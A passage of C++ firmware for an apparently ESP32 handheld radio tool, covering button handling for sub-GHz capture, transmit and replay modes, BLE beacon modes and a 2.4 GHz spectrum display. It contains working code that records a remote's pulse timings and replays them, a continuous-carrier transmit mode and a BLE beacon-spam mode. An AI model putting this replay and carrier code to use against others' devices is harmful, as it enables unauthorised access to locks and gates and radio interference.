            if (isPressed(BTN_DOWN)) rfStepFrequencyFine(-0.00625f);
        }
    }
    else if (currentRadioMode == RF_ROLLING_CAPTURE) {
        static unsigned long rcRightPressStart = 0;
        bool rightHeld = (companion_readButtonState(BTN_RIGHT) == LOW);
        if (rightHeld && rcRightPressStart == 0) rcRightPressStart = millis();
        if (!rightHeld) rcRightPressStart = 0;
        bool holdMode = (rightHeld && rcRightPressStart > 0 && (millis() - rcRightPressStart > 300));
        rfRollingHoldMode = holdMode;

        if (holdMode) {
            // Hold RIGHT: SELECT/LEFT = coarse +/-1 MHz, UP/DOWN = preset hop
            if (isPressed(BTN_SELECT)) {
                rfLockedFrequencyMHz = floorf(rfLockedFrequencyMHz) + 1.0f;
                if (rfLockedFrequencyMHz > 928.0f) rfLockedFrequencyMHz = 300.0f;
                if (ensureCC1101Ready()) cc1101SetFrequencyMHz(rfLockedFrequencyMHz);
                rfRollingFirstDraw = true;
                delay(120);
            }
            if (isPressed(BTN_LEFT)) {
                rfLockedFrequencyMHz = floorf(rfLockedFrequencyMHz) - 1.0f;
                if (rfLockedFrequencyMHz < 300.0f) rfLockedFrequencyMHz = 928.0f;
                if (ensureCC1101Ready()) cc1101SetFrequencyMHz(rfLockedFrequencyMHz);
                rfRollingFirstDraw = true;
                delay(120);
            }
            if (isPressed(BTN_UP)) {
                // Preset hop up
                if (rfLockedFrequencyMHz < 350.0f)      rfLockedFrequencyMHz = 433.92f;
                else if (rfLockedFrequencyMHz < 500.0f) rfLockedFrequencyMHz = 868.35f;
                else if (rfLockedFrequencyMHz < 900.0f) rfLockedFrequencyMHz = 915.0f;
                else                                     rfLockedFrequencyMHz = 315.0f;
                if (ensureCC1101Ready()) cc1101SetFrequencyMHz(rfLockedFrequencyMHz);
                rfRollingFirstDraw = true;
                delay(120);
            }
        } else {
            // Normal: UP/DOWN = 6.25 kHz fine tune
            if (isPressed(BTN_UP)) {
                rfLockedFrequencyMHz += 0.00625f;
                rfLockedFrequencyMHz = constrain(rfLockedFrequencyMHz, 300.0f, 928.0f);
                if (ensureCC1101Ready()) cc1101SetFrequencyMHz(rfLockedFrequencyMHz);
                rfRollingFirstDraw = true;
            }
            if (isPressed(BTN_DOWN)) {
                rfLockedFrequencyMHz -= 0.00625f;
                rfLockedFrequencyMHz = constrain(rfLockedFrequencyMHz, 300.0f, 928.0f);
                if (ensureCC1101Ready()) cc1101SetFrequencyMHz(rfLockedFrequencyMHz);
                rfRollingFirstDraw = true;
            }
            if (isPressed(BTN_SELECT)) {
                extern bool rfRollingSelectPressed;
                rfRollingSelectPressed = true;
                delay(200);
            }
        }
    }
    else if (currentRadioMode == RF_SIGNAL_CAPTURE) {
        static unsigned long capRightStart = 0;
        bool capHold = rfIsRightHoldMode(capRightStart, millis());

        if (rfCaptureRecording) {
            if (isPressed(BTN_SELECT)) finalizeRFSignalCaptureRecording();
        } else {
            if (capHold) {
                if (isPressed(BTN_SELECT)) { rfStepFrequencyCoarse(1.0f);  if (ensureCC1101Ready()) { cc1101SetFrequencyMHz(rfLockedFrequencyMHz); cc1101EnterRx(); } resetRFMonitorHistory(); rfCaptureFirstDraw = true; delay(120); }
                if (isPressed(BTN_LEFT))   { rfStepFrequencyCoarse(-1.0f); if (ensureCC1101Ready()) { cc1101SetFrequencyMHz(rfLockedFrequencyMHz); cc1101EnterRx(); } resetRFMonitorHistory(); rfCaptureFirstDraw = true; delay(120); }
                if (isPressed(BTN_UP))     { rfCycleBandPresetBy(1);       if (ensureCC1101Ready()) { cc1101SetFrequencyMHz(rfLockedFrequencyMHz); cc1101EnterRx(); } resetRFMonitorHistory(); rfCaptureFirstDraw = true; delay(120); }
                if (isPressed(BTN_DOWN))   { rfCycleBandPresetBy(-1);      if (ensureCC1101Ready()) { cc1101SetFrequencyMHz(rfLockedFrequencyMHz); cc1101EnterRx(); } resetRFMonitorHistory(); rfCaptureFirstDraw = true; delay(120); }
            } else {
                if (isPressed(BTN_UP) && rfCaptureThreshold < -45)   rfCaptureThreshold += 2;
                if (isPressed(BTN_DOWN) && rfCaptureThreshold > -105) rfCaptureThreshold -= 2;
                if (isPressed(BTN_SELECT)) beginRFSignalCaptureRecording();
            }
        }
    }
    else if (currentRadioMode == RF_TRANSMIT) {
        bool rfTransmitSelectDown = (companion_readButtonState(BTN_SELECT) == LOW);
        static unsigned long txRightStart = 0;
        bool txHold = rfIsRightHoldMode(txRightStart, millis());

        // LEFT button: stop transmit immediately then navigate back
        if (digitalRead(BTN_LEFT) == LOW && !txHold) {
            if (rfTransmitActive) {
                stopRFTransmitNow();
            }
            // fall through to global back handler
        }

        if (rfSubLoaded) {
            if (txHold) {
                if (rfTransmitActive) {
                    stopRFTransmitNow();
                    rfTransmitStatus = "Stopped";
                    rfTransmitStatusUntil = millis() + 1200;
                }

                if (isPressed(BTN_SELECT)) {
                    rfStepFrequencyCoarse(1.0f);
                    rfTransmitFirstDraw = true;
                    delay(120);
                }

                if (isPressed(BTN_LEFT)) {
                    rfStepFrequencyCoarse(-1.0f);
                    rfTransmitFirstDraw = true;
                    delay(120);
                }

                if (isPressed(BTN_UP)) {
                    rfCycleBandPresetBy(1);
                    rfTransmitFirstDraw = true;
                    delay(120);
                }

                if (isPressed(BTN_DOWN)) {
                    rfCycleBandPresetBy(-1);
                    rfTransmitFirstDraw = true;
                    delay(120);
                }
            } else {
                if (isPressed(BTN_UP))   { rfStepFrequencyFine(0.00625f);  rfTransmitFirstDraw = true; }
                if (isPressed(BTN_DOWN)) { rfStepFrequencyFine(-0.00625f); rfTransmitFirstDraw = true; }

                if (rfTransmitSelectDown && !rfTransmitActive) {
                    rfTransmitActive = true;
                    rfTransmitLastSendMs = 0;
                    rfTransmitLastRearmMs = 0;
                    rfTransmitStatus = "Replaying...";
                    rfTransmitStatusUntil = millis() + 900;
                } else if (!rfTransmitSelectDown && rfTransmitActive) {
                    stopRFTransmitNow();
                    rfTransmitStatus = "Replay stopped";
                    rfTransmitStatusUntil = millis() + 1200;
                }
            }
        } else {
            if (txHold) {
                if (rfTransmitActive) {
                    stopRFTransmitNow();
                    rfTransmitStatus = "Stopped";
                    rfTransmitStatusUntil = millis() + 1200;
                }

                if (isPressed(BTN_SELECT)) {
                    rfStepFrequencyCoarse(1.0f);
                    rfTransmitFirstDraw = true;
                    delay(120);
                }

                if (isPressed(BTN_LEFT)) {
                    rfStepFrequencyCoarse(-1.0f);
                    rfTransmitFirstDraw = true;
                    delay(120);
                }

                if (isPressed(BTN_UP)) {
                    rfCycleBandPresetBy(1);
                    rfTransmitFirstDraw = true;
                    delay(120);
                }

                if (isPressed(BTN_DOWN)) {
                    rfCycleBandPresetBy(-1);
                    rfTransmitFirstDraw = true;
                    delay(120);
                }
            } else {
                if (isPressed(BTN_UP))   { rfStepFrequencyFine(0.00625f);  rfTransmitFirstDraw = true; }
                if (isPressed(BTN_DOWN)) { rfStepFrequencyFine(-0.00625f); rfTransmitFirstDraw = true; }

                if (rfTransmitSelectDown && !rfTransmitActive) {
                    rfTransmitLastSendMs = 0;
                    rfTransmitLastRearmMs = 0;
                    if (startRFContinuousCarrier()) {
                        rfTransmitActive = true;
                        rfTransmitStatus = "Carrier on";
                    } else {
                        rfTransmitActive = false;
                        rfTransmitStatus = "Carrier failed";
                    }
                    rfTransmitStatusUntil = millis() + 900;
                } else if (!rfTransmitSelectDown && rfTransmitActive) {
                    stopRFTransmitNow();
                    rfTransmitStatus = "Stopped";
                    rfTransmitStatusUntil = millis() + 1200;
                }
            }
        }

        rfTransmitSelectLatched = rfTransmitSelectDown;
    }
    else if (currentRadioMode == RF_REPLAY) {
        static unsigned long repRightStart = 0;
        bool repHold = rfIsRightHoldMode(repRightStart, millis());

        if (repHold) {
            if (isPressed(BTN_SELECT)) { rfStepFrequencyCoarse(1.0f);  if (ensureCC1101Ready()) { cc1101SetFrequencyMHz(rfLockedFrequencyMHz); cc1101EnterRx(); } rfReplayFirstDraw = true; delay(120); }
            if (isPressed(BTN_LEFT))   { rfStepFrequencyCoarse(-1.0f); if (ensureCC1101Ready()) { cc1101SetFrequencyMHz(rfLockedFrequencyMHz); cc1101EnterRx(); } rfReplayFirstDraw = true; delay(120); }
            if (isPressed(BTN_UP))     { rfCycleBandPresetBy(1);       if (ensureCC1101Ready()) { cc1101SetFrequencyMHz(rfLockedFrequencyMHz); cc1101EnterRx(); } rfReplayFirstDraw = true; delay(120); }
            if (isPressed(BTN_DOWN))   { rfCycleBandPresetBy(-1);      if (ensureCC1101Ready()) { cc1101SetFrequencyMHz(rfLockedFrequencyMHz); cc1101EnterRx(); } rfReplayFirstDraw = true; delay(120); }
        } else {
            if (isPressed(BTN_UP))   { rfStepFrequencyFine(0.00625f);  if (ensureCC1101Ready()) { cc1101SetFrequencyMHz(rfLockedFrequencyMHz); cc1101EnterRx(); } rfReplayFirstDraw = true; }
            if (isPressed(BTN_DOWN)) { rfStepFrequencyFine(-0.00625f); if (ensureCC1101Ready()) { cc1101SetFrequencyMHz(rfLockedFrequencyMHz); cc1101EnterRx(); } rfReplayFirstDraw = true; }
            if (isPressed(BTN_SELECT)) {
            if (!rfReplayHasCapture) {
                const int captureRssiThreshold = -98;
                const int minValidTimings = 6;
                const unsigned long minBurstUs = 800UL;
                rfReplayStatus = "Capturing...";
                rfReplayStatusUntil = millis() + 3000;
                rfReplayFirstDraw = true;
                resetRFReplayCaptureState();

                if (!ensureCC1101Ready()) {
                    rfReplayStatus = "CC1101 not ready";
                    rfReplayStatusUntil = millis() + 2000;
                    rfReplayFirstDraw = true;
                }
                else if (!rfReplayEnsureBuf()) {
                    rfReplayStatus = "No memory";
                    rfReplayStatusUntil = millis() + 2000;
                    rfReplayFirstDraw = true;
                }
                else {
                    cc1101SetFrequencyMHz(rfLockedFrequencyMHz);
                    cc1101EnterRx();
                    pinMode(CC1101_GDO0, INPUT);
                    rfReplayListening = true;

                    int peakRssi = -127;
                    bool sawStart = false;
                    unsigned long waitStart = millis();
                    while (millis() - waitStart < 2400) {
                        int sampleRssi = cc1101ReadRSSI();
                        if (sampleRssi > peakRssi) peakRssi = sampleRssi;
                        if (sampleRssi >= captureRssiThreshold && digitalRead(CC1101_GDO0) == HIGH) {
                            sawStart = true;
                            break;
                        }
                        yield();
                        delay(1);
                    }

                    if (!sawStart) {
                        rfReplayStatus = "No clear burst";
                    }
                    else {
                        unsigned long totalDurationUs = 0;
                        unsigned long longestPulseUs = 0;
                        int structuredPulseCount = 0;
                        for (int i = 0; i < 256 && rfReplayRawCount < 256; i++) {
                            unsigned long hi = pulseIn(CC1101_GDO0, HIGH, 12000UL);
                            unsigned long lo = pulseIn(CC1101_GDO0, LOW,  12000UL);
                            if (hi == 0 && lo == 0) break;
                            if (hi >= 60 && hi <= 14000UL) {
                                rfReplayRawTimings[rfReplayRawCount++] = (uint16_t)constrain(hi, 1UL, 65535UL);
                                totalDurationUs += hi;
                                if (hi > longestPulseUs) longestPulseUs = hi;
                                if (hi >= 150UL) structuredPulseCount++;
                            }
                            if (lo >= 60 && lo <= 14000UL && rfReplayRawCount < 256) {
                                rfReplayRawTimings[rfReplayRawCount++] = (uint16_t)constrain(lo, 1UL, 65535UL);
                                totalDurationUs += lo;
                                if (lo > longestPulseUs) longestPulseUs = lo;
                                if (lo >= 150UL) structuredPulseCount++;
                            }
                            if ((i & 0x0F) == 0x0F) yield();
                        }

                        while (rfReplayRawCount >= 4 &&
                               (rfReplayRawCount % 2) == 0 &&
                               rfReplayRawTimings[rfReplayRawCount - 1] >= 2200UL) {
                            totalDurationUs -= rfReplayRawTimings[rfReplayRawCount - 1];
                            rfReplayRawCount--;
                        }

                        if (peakRssi >= captureRssiThreshold &&
                            rfReplayRawCount >= minValidTimings &&
                            totalDurationUs >= minBurstUs &&
                            structuredPulseCount >= 4 &&
                            longestPulseUs >= 180UL) {
                            rfReplayCapturedBits = rfReplayRawCount / 2;
                            unsigned long val = 0;
                            unsigned long pivot = rfReplayRawTimings[0];
                            for (int i = 0; i < rfReplayRawCount && i < 32; i += 2) {
                                val = (val << 1) | (rfReplayRawTimings[i] > pivot ? 1UL : 0UL);
                            }
                            rfReplayCapturedValue = val;
                            rfReplayHasCapture = true;
                            rfReplayStatus = "Captured " + String(rfReplayRawCount) + " pulses";
                        }
                        else {
                            resetRFReplayCaptureState();
                            rfReplayStatus = "Weak/noisy burst ignored";
                        }
                    }
                }

                rfReplayStatusUntil = millis() + 2000;
                rfReplayFirstDraw = true;
            }
            else if (rfReplayRawTimings && rfReplayRawCount >= 4 && ensureCC1101Ready()) {
                rfReplayStatus = "Hold replay active";
                rfReplayStatusUntil = millis() + 1500;

                cc1101Strobe(CC1101_SIDLE);
                delayMicroseconds(200);
                cc1101SetFrequencyMHz(rfLockedFrequencyMHz);
                cc1101WriteReg(CC1101_PKTCTRL0, 0x32);
                cc1101WriteReg(CC1101_IOCFG0, 0x2D);
                cc1101WriteReg(CC1101_MCSM1, 0x00);
                uint8_t pa[8] = {0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
                cc1101WriteBurst(CC1101_PATABLE, pa, 8);
                cc1101WriteReg(CC1101_FREND0, 0x11);
                cc1101Strobe(CC1101_SCAL);
                delay(3);

                pinMode(CC1101_GDO0, OUTPUT);
                digitalWrite(CC1101_GDO0, LOW);
                cc1101Strobe(CC1101_STX);
                delayMicroseconds(150);

                const uint32_t gdo0Bit = (1UL << CC1101_GDO0);
                bool keepSending = true;
                while (keepSending) {
                    bool high = true;
                    for (int i = 0; i < rfReplayRawCount; i++) {
                        if (high) {
                            GPIO.out_w1ts = gdo0Bit;
                        } else {
                            GPIO.out_w1tc = gdo0Bit;
                        }
                        delayMicroseconds(rfReplayRawTimings[i]);
                        high = !high;
                    }
                    GPIO.out_w1tc = gdo0Bit;
                    yield();
                    keepSending = (companion_readButtonState(BTN_SELECT) == LOW);
                    if (keepSending) {
                        delayMicroseconds(80);
                    }
                }

                cc1101Strobe(CC1101_SIDLE);
                delayMicroseconds(200);
                pinMode(CC1101_GDO0, INPUT);
                cc1101ConfigureBase();
                cc1101SetFrequencyMHz(rfLockedFrequencyMHz);
                cc1101EnterRx();
                rfReplayListening = true;
                rfReplayStatus = "Replay stopped";
                rfReplayStatusUntil = millis() + 1200;
                rfReplayFirstDraw = true;
            }
            else {
                rfReplayStatus = "Capture first";
                rfReplayStatusUntil = millis() + 1500;
                rfReplayFirstDraw = true;
            }
        }  // end SELECT
        }  // end !repHold else
    }  // end RF_REPLAY
    else if (currentRadioMode == BLE_BEACON_SPAM) {

        if (isPressed(BTN_UP) && bleBeaconRotateIntervalMs > 1000) {
            bleBeaconRotateIntervalMs -= 500;
            bleBeaconNeedsRedraw = true;
            LOG(String("BLE interval -> ") + String(bleBeaconRotateIntervalMs) + "ms");
        }

        if (isPressed(BTN_DOWN) && bleBeaconRotateIntervalMs < 15000) {
            bleBeaconRotateIntervalMs += 500;
            bleBeaconNeedsRedraw = true;
            LOG(String("BLE interval -> ") + String(bleBeaconRotateIntervalMs) + "ms");
        }

        if (isPressed(BTN_SELECT)) {
            bleBeaconLastRotate = 0;
            bleBeaconNeedsRedraw = true;
            LOG("BLE manual rename trigger");
        }
    }
    else if (currentRadioMode == BLE_DEVICE_STABLE) {

        if (isPressed(BTN_SELECT)) {
            LOG("BLE stable refresh");
            bleDeviceLastRotate = 0;
            bleDeviceStatus = "Refresh";
            bleDeviceNeedsRedraw = true;
        }
    }
    else if (currentRadioMode == BLE_RADAR) {

        if (companion_readButtonState(BTN_SELECT) == LOW && millis() - bleRadarLastFocusPress > 180) {
            bleRadarLastFocusPress = millis();

            if (bleDeviceCount > 0) {
                setBLEFocusedDevice(0);
                bleRadarNeedsRedraw = true;
            }
        }
    }
    else if (currentRadioMode == BLE_SIGNAL_LOGGER) {

        if (isPressed(BTN_UP) && bleLoggerSampleIntervalMs > 200) {
            bleLoggerSampleIntervalMs -= 100;
            bleLoggerNeedsRedraw = true;
        }

        if (isPressed(BTN_DOWN) && bleLoggerSampleIntervalMs < 2000) {
            bleLoggerSampleIntervalMs += 100;
            bleLoggerNeedsRedraw = true;
        }

        if (isPressed(BTN_SELECT)) {
            resetBLELoggerBuffer();
        }
    }
    else if (currentRadioMode == BLE_BEACON_TEST) {

        if (isPressed(BTN_SELECT)) {
            LOG("BLE beacon test refresh");
            if (bleBeaconAdvertising) {
                bleBeaconAdvertising->stop();
            } else {
                NimBLEDevice::stopAdvertising();
            }
            bleBeaconTestInitialized = false;
            bleBeaconTestStatus = "Refresh";
            bleBeaconTestNeedsRedraw = true;
        }
    }
}

uint16_t dimColor565(uint16_t color, uint8_t divisor) {
    uint8_t r = ((color >> 11) & 0x1F) * 255 / 31;
    uint8_t g = ((color >> 5) & 0x3F) * 255 / 63;
    uint8_t b = (color & 0x1F) * 255 / 31;

    if (divisor == 0) divisor = 1;

    return tft.color565(r / divisor, g / divisor, b / divisor);
}

int getChannelColumnStart(int ch) {
    return GHZ_INNER_X0 + (ch * GHZ_INNER_W) / CHANNEL_COUNT;
}

int getChannelColumnEnd(int ch) {
    int end = GHZ_INNER_X0 + (((ch + 1) * GHZ_INNER_W) / CHANNEL_COUNT) - 1;
    if (ch >= CHANNEL_COUNT - 1 || end > GHZ_INNER_X1) end = GHZ_INNER_X1;
    if (end < GHZ_INNER_X0) end = GHZ_INNER_X0;
    return end;
}

uint16_t getWaterfallPaletteColor(uint8_t strength) {
    float norm = clampBLEFloat(strength / 25.0f, 0.0f, 1.0f);

    if (norm < 0.08f) return ILI9341_BLACK;
    if (norm < 0.18f) return tft.color565(10, 18, 60);
    if (norm < 0.30f) return tft.color565(28, 64, 180);
    if (norm < 0.42f) return tft.color565(0, 150, 255);
    if (norm < 0.56f) return tft.color565(0, 210, 150);
    if (norm < 0.70f) return tft.color565(120, 220, 40);
    if (norm < 0.82f) return tft.color565(255, 220, 0);
    if (norm < 0.92f) return tft.color565(255, 140, 0);
    if (norm < 0.98f) return tft.color565(255, 50, 60);
    return tft.color565(255, 255, 255);
}

int getSelected24GHzIndex() {
    int index = selectedChannel - 1;
    if (index < 0) index = 0;
    if (index >= CHANNEL_COUNT) index = CHANNEL_COUNT - 1;
    return index;
}

float get24GHzDisplayPercentForChannel(int ch, bool noiseMode) {
    ch = constrain(ch, 0, CHANNEL_COUNT - 1);
    if (noiseMode) {
        return clampBLEFloat(noiseLevel[ch], 0.0f, 1.0f) * 100.0f;
    }
    return clampBLEFloat(channelActivity[ch] / 25.0f, 0.0f, 1.0f) * 100.0f;
}

float sample24GHzSpectrumPercent(float channelPos, bool noiseMode) {
    channelPos = clampBLEFloat(channelPos, 0.0f, (float)(CHANNEL_COUNT - 1));
    int base = (int)channelPos;
    int next = min(CHANNEL_COUNT - 1, base + 1);
    float frac = channelPos - (float)base;

    float a = get24GHzDisplayPercentForChannel(base, noiseMode);
    float b = get24GHzDisplayPercentForChannel(next, noiseMode);
    return a + ((b - a) * frac);
}

String get24GHzSpectrumPillText(bool noiseMode) {
    if (noiseMode) {
        return String("2.4GHz NOISE  CH ") + String(scanChannel + 1);
    }
    return String("2.4GHz SCAN  CH ") + String(selectedChannel);
}

void render24GHzSpectrum(bool noiseMode, bool fullRedraw) {
    const uint16_t bg = ILI9341_BLACK;
    const uint16_t grid = tft.color565(42, 42, 42);
    const uint16_t gridStrong = tft.color565(70, 70, 70);
    const uint16_t trace = ILI9341_WHITE;
    const uint16_t peakLine = tft.color565(255, 64, 64);
    const uint16_t tuneLine = tft.color565(96, 220, 120);
    const uint16_t fill = tft.color565(18, 74, 164);
    const uint16_t fillSoft = tft.color565(8, 34, 84);
    const int graphBottom = RF_SWEEP_GRAPH_H - 1;
    const size_t pixelCount = RF_SWEEP_GRAPH_W * RF_SWEEP_GRAPH_H;

    for (size_t i = 0; i < pixelCount; i++) {
        rfSweepSpectrumBuffer[i] = bg;
        if ((i & 0x7FF) == 0x7FF) {
            yield();
        }
    }

    auto plot = [&](int x, int y, uint16_t color) {
        if (x < 0 || x >= RF_SWEEP_GRAPH_W || y < 0 || y >= RF_SWEEP_GRAPH_H) {
            return;
        }
        rfSweepSpectrumBuffer[(y * RF_SWEEP_GRAPH_W) + x] = color;
    };

    auto drawVLine = [&](int x, int yStart, int length, uint16_t color) {
        for (int i = 0; i < length; i++) {
            plot(x, yStart + i, color);
        }
    };

    auto drawLine = [&](int x0, int y0, int x1, int y1, uint16_t color) {
        int dx = abs(x1 - x0);
        int sx = x0 < x1 ? 1 : -1;
        int dy = -abs(y1 - y0);
        int sy = y0 < y1 ? 1 : -1;
        int err = dx + dy;

        while (true) {
            plot(x0, y0, color);
            if (x0 == x1 && y0 == y1) {
                break;
            }
            int e2 = err * 2;
            if (e2 >= dy) {
                err += dy;
                x0 += sx;
            }
            if (e2 <= dx) {
                err += dx;
                y0 += sy;
            }
        }
    };

    for (int i = 0; i <= 4; i++) {
        int y = ((RF_SWEEP_GRAPH_H - 1) * i) / 4;
        uint16_t color = (i == 4) ? gridStrong : grid;
        for (int x = 0; x < RF_SWEEP_GRAPH_W; x++) {
            plot(x, y, color);
        }
        yield();
    }

    for (int i = 1; i < 4; i++) {
        int x = (RF_SWEEP_GRAPH_W * i) / 4;
        drawVLine(x, 0, RF_SWEEP_GRAPH_H, grid);
    }

    int peakIndex = 0;
    float peakLevel = -1.0f;
    int prevY = graphBottom;

    for (int x = 0; x < RF_SWEEP_GRAPH_W; x++) {
        float channelPos = (x * (CHANNEL_COUNT - 1)) / (float)max(1, RF_SWEEP_GRAPH_W - 1);
        float level = sample24GHzSpectrumPercent(channelPos, noiseMode);
        if (level >= peakLevel) {
            peakLevel = level;
            peakIndex = x;
        }

        int height = max(1, (int)((level * (RF_SWEEP_GRAPH_H - 6)) / 100.0f));
        int y = graphBottom - height;
        drawVLine(x, y, height, fill);
        if (height > 8) {
            drawVLine(x, y + (height / 2), height / 2, fillSoft);
        }

        if (x > 0) {
            drawLine(x - 1, prevY, x, y, trace);
        } else {
            plot(x, y, trace);
        }
        prevY = y;

        if ((x & 0x1F) == 0x1F) {
            yield();
        }
    }

    drawVLine(peakIndex, 2, RF_SWEEP_GRAPH_H - 4, peakLine);

    int tuneChannel = noiseMode ? scanChannel : getSelected24GHzIndex();
    int tuneIndex = (tuneChannel * (RF_SWEEP_GRAPH_W - 1)) / max(1, CHANNEL_COUNT - 1);
    tuneIndex = constrain(tuneIndex, 0, RF_SWEEP_GRAPH_W - 1);
    drawVLine(tuneIndex, 2, RF_SWEEP_GRAPH_H - 4, tuneLine);

    tft.drawRGBBitmap(RF_SWEEP_GRAPH_X,
                      RF_SWEEP_GRAPH_Y,
                      rfSweepSpectrumBuffer,
                      RF_SWEEP_GRAPH_W,
                      RF_SWEEP_GRAPH_H);

    String bandText = get24GHzSpectrumPillText(noiseMode);
    int16_t bandX1, bandY1;
    uint16_t bandW, bandH;
    tft.getTextBounds(bandText, 0, 0, &bandX1, &bandY1, &bandW, &bandH);
    int pillW = max(92, (int)bandW + 18);
    int pillX = RF_SWEEP_GRAPH_X + ((RF_SWEEP_GRAPH_W - pillW) / 2);
    const int pillY = RF_SWEEP_GRAPH_Y + RF_SWEEP_GRAPH_H + 4;
    tft.fillRect(RF_SWEEP_GRAPH_X + 16, pillY - 1, RF_SWEEP_GRAPH_W - 32, 14, ILI9341_BLACK);
    tft.fillRoundRect(pillX, pillY, pillW, 12, 5, tft.color565(18, 18, 18));
    tft.drawRoundRect(pillX, pillY, pillW, 12, 5, tft.color565(64, 64, 64));
    tft.setTextSize(1);
    tft.setTextColor(ILI9341_WHITE);
    tft.setCursor(pillX + ((pillW - (int)bandW) / 2), pillY + 2);
    tft.print(bandText);

    if (fullRedraw) {
        tft.fillRect(0, RF_SWEEP_GRAPH_Y - 2, RF_SWEEP_GRAPH_X - 2, RF_SWEEP_GRAPH_H + 6, ILI9341_BLACK);
        tft.setTextSize(1);
        tft.setTextColor(tft.color565(150, 150, 150));
        tft.setCursor(2, RF_SWEEP_GRAPH_Y - 2);
        tft.print("100");
        tft.setCursor(2, RF_SWEEP_GRAPH_Y + (RF_SWEEP_GRAPH_H / 2) - 5);
        tft.print(" 50");
        tft.setCursor(2, RF_SWEEP_GRAPH_Y + RF_SWEEP_GRAPH_H - 8);
        tft.print("  0");
    }
}

void drawScannerSpectrumColumn(int ch, bool highlighted) {
    if (ch < 0 || ch >= CHANNEL_COUNT) return;

    const int topY = SCANNER_SPECTRUM_Y;
    const int maxHeight = SCANNER_SPECTRUM_HEIGHT;
    const int horizonY = topY + maxHeight - 4;
    const uint16_t bg = ILI9341_BLACK;
    const uint16_t horizon = tft.color565(180, 180, 180);

    int x0 = getChannelColumnStart(ch);
    int x1 = getChannelColumnEnd(ch);
    if (x1 < x0) x1 = x0;

    int clearX = max(0, x0 - 1);
    int clearW = min(240 - clearX, (x1 - x0) + 3);
    tft.fillRect(clearX, topY, clearW, maxHeight + 8, bg);
    tft.drawFastHLine(clearX, horizonY, clearW, dimColor565(horizon, 2));
    tft.drawFastHLine(clearX, horizonY + 1, clearW, horizon);

    float left = channelActivity[max(0, ch - 1)];
    float center = channelActivity[ch];
    float right = channelActivity[min(CHANNEL_COUNT - 1, ch + 1)];
    float smoothed = (left + center + right) / 3.0f;
    float norm = clampBLEFloat(smoothed / 25.0f, 0.0f, 1.0f);
    int height = max(2, (int)(norm * maxHeight));
    int peakY = horizonY - height;
    uint16_t color = getWaterfallPaletteColor((uint8_t)smoothed);
    uint16_t glow = dimColor565(color, 2);
    uint16_t bloom = dimColor565(color, 3);

    for (int x = x0; x <= x1; x++) {
        tft.drawFastVLine(x, peakY, height, color);
        if (height > 5) {
            tft.drawFastVLine(x, peakY - 3, 3, glow);
        }
        tft.drawFastVLine(x, horizonY + 2, max(2, height / 5), bloom);
    }

    if (highlighted) {
        int beamX = (x0 + x1) / 2;
        tft.drawFastVLine(beamX, topY + 1, maxHeight + 4, ILI9341_WHITE);
        if (beamX > 0) {
            tft.drawFastVLine(beamX - 1, topY + 8, maxHeight - 8, dimColor565(ILI9341_WHITE, 3));
        }
        if (beamX < 239) {
            tft.drawFastVLine(beamX + 1, topY + 8, maxHeight - 8, dimColor565(ILI9341_WHITE, 3));
        }
    }
}

void drawTopScanner() {
    bool fullRedraw = ghzScannerFirstDraw;
    if (fullRedraw) {
        drawRFScreenHeader("2.4GHz Scanner", "Live spectrum + waterfall");
        tft.drawRect(RF_SWEEP_GRAPH_X - 2, RF_SWEEP_GRAPH_Y - 2,
                     RF_SWEEP_GRAPH_W + 4, RF_SWEEP_GRAPH_H + 4,
                     tft.color565(58, 58, 58));
        tft.drawRect(RF_SWEEP_WATERFALL_X - 2, RF_SWEEP_WATERFALL_Y - 2,
                     RF_SWEEP_WATERFALL_W + 4, RF_SWEEP_WATERFALL_H + 4,
                     tft.color565(58, 58, 58));
        tft.fillRect(RF_SWEEP_GRAPH_X, RF_SWEEP_GRAPH_Y,
                     RF_SWEEP_GRAPH_W, RF_SWEEP_GRAPH_H, ILI9341_BLACK);
        tft.fillRect(RF_SWEEP_WATERFALL_X, RF_SWEEP_WATERFALL_Y,
                     RF_SWEEP_WATERFALL_W, RF_SWEEP_WATERFALL_H, ILI9341_BLACK);
        drawRFFooterLine(0, 272, "UP/DN channel  SEL lock");
        drawRFFooterLine(1, 286, "LEFT back  Live 2.4GHz");
        ghzScannerLastHighlight = -1;
        ghzScannerLastInfoChannel = -1;
        ghzScannerLastInfoStrength = -1;
        ghzScannerLastInfoAverage = -1;
        ghzScannerLastInfoPeak = -1;
        ghzScannerFirstDraw = false;
    }

    render24GHzSpectrum(false, fullRedraw);
}

// ===== SYSTEM INFO =====
void drawStatusLine(int y, const char* label, const char* value, uint16_t valueColor) {
    tft.setTextSize(2);
    tft.setTextColor(ILI9341_WHITE);
    tft.setCursor(16, y);
    tft.print(label);

    tft.setTextColor(valueColor);
    tft.setCursor(138, y);
    tft.print(value);
}

void drawSystemInfoScreen() {
    if (!radio24ActivePrepared) {
        probeRadio2Chip(false);
        probeCC1101Chip(false);
        refreshDiagnosticsStatus();
    }

    logHeapTelemetry("info");

    tft.fillScreen(ILI9341_BLACK);
    drawStatusBar();

    uint16_t textSoft = tft.color565(160, 160, 160);

    tft.setTextSize(2);
    tft.setTextColor(ILI9341_WHITE);
    tft.setCursor(16, 36);
    tft.print("Tool Health");

    tft.setTextSize(1);
    tft.setTextColor(textSoft);
    tft.setCursor(16, 56);
    tft.print("Live radios, memory, storage");

    const uint32_t freeHeap = ESP.getFreeHeap();
    const uint32_t largestBlock = (uint32_t)heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);
    const int pinnedIcons = countPinnedIconsInCache();
    const bool lowHeap = freeHeap < 90000UL || largestBlock < 42000UL;
    const uint8_t safeModeTool = prefs.getUChar("safeTool", 0);
    String safeWhy = prefs.getString("safeWhy", "");

    drawStatusLine(80, "Diag", diagnosticsOk ? "OK" : "WARN", diagnosticsOk ? ILI9341_GREEN : ILI9341_RED);
    drawStatusLine(98, "NRF1", radio1Ok ? "OK" : "FAIL", radio1Ok ? ILI9341_GREEN : ILI9341_RED);
    drawStatusLine(116, "NRF2", radio3Ok ? "OK" : "MISS", radio3Ok ? ILI9341_GREEN : textSoft);
    drawStatusLine(134, "CC1101", cc1101Ok ? "OK" : "FAIL", cc1101Ok ? ILI9341_GREEN : ILI9341_RED);
    drawStatusLine(152, "LittleFS", flashFsReady ? "READY" : "FAIL", flashFsReady ? ILI9341_GREEN : ILI9341_RED);

    const char* sdLabel = sdError ? "ERROR" : (sdMounted ? "MOUNTED" : "IDLE");
    drawStatusLine(170, "SD", sdLabel, sdError ? ILI9341_RED : (sdMounted ? ILI9341_GREEN : textSoft));

